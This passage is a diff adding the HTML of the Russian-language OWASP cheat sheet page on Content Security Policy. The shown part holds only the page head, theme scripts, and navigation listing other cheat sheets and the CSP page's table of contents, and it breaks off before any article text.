@@ -1,0 +1,3934 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
+      
+      
+      
+        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">
+      
+      
+        <link rel="prev" href="Clickjacking_Defense_Cheat_Sheet.html">
+      
+      
+        <link rel="next" href="Cookie_Theft_Mitigation_Cheat_Sheet.html">
+      
+      
+      <link rel="icon" href="../assets/WebSite_Favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>Content Security Policy - OWASP Серия шпаргалок по безопасности</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#content-security-policy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-header__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OWASP Серия шпаргалок по безопасности
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Content Security Policy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-nav__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    OWASP Серия шпаргалок по безопасности
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Введение
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Glossary.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс (по алфавиту)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс ASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexMASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс MASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexProactiveControls.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс превентивных мер
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexTopTen.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс Top 10
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Шпаргалки
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Шпаргалки
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AI_Agent_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AI-агентов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AJAX
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Случаи злоупотреблений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Контроль доступа
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ поверхности атаки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Автоматизация тестирования авторизации
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Automotive_Security.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность автомобилей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация Bean
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Уязвимости расширений браузера
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Укрепление C-инструментальной цепочки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="CI_CD_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CI/CD
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Выбор и использование секретных вопросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от Clickjacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Content Security Policy
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Content Security Policy
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Контекст
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Контекст">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита от XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Защита от XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Ограничение встроенных скриптов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Ограничение удалённых скриптов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Ограничение небезопасного JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Ограничение отправки форм
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Ограничение объектов
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита от атак через фреймирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Эшелонированная защита
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Доставка политики
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Доставка политики">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-content-security-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Заголовок Content-Security-Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-content-security-policy-report-only" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Заголовок Content-Security-Policy-Report-Only
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-meta-content-security-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Meta-тег Content-Security-Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      ПРЕДУПРЕЖДЕНИЕ
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Типы CSP (гранулярный/на основе списков разрешений или строгий)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Строгая CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nonce" class="md-nav__link">
+    <span class="md-ellipsis">
+      На основе nonce
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="На основе nonce">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Предупреждение
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Хеши
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Хеши">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примечание
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-dynamic" class="md-nav__link">
+    <span class="md-ellipsis">
+      strict-dynamic
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подробные директивы CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Подробные директивы CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fetch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы Fetch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы документа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы навигации
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы отчётности
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Специальные источники директив
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примеры политик CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Примеры политик CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Строгая политика">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nonce_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика на основе nonce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика на основе хеша
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Базовая нестрогая политика CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обновление небезопасных запросов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Предотвращение атак через фреймирование (Clickjacking, межсайтовые утечки)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Рефакторинг встроенного кода
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ссылки
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cookie_Theft_Mitigation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение кражи Cookie
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Credential Stuffing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение CSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Криптографическое хранилище
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_Clobbering_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM Clobbering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность баз данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Отказ в обслуживании
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Dependency_Graph_SBOM_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Граф зависимостей SBOM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Десериализация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_REST_Framework_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Django REST Framework
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Django
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
+        
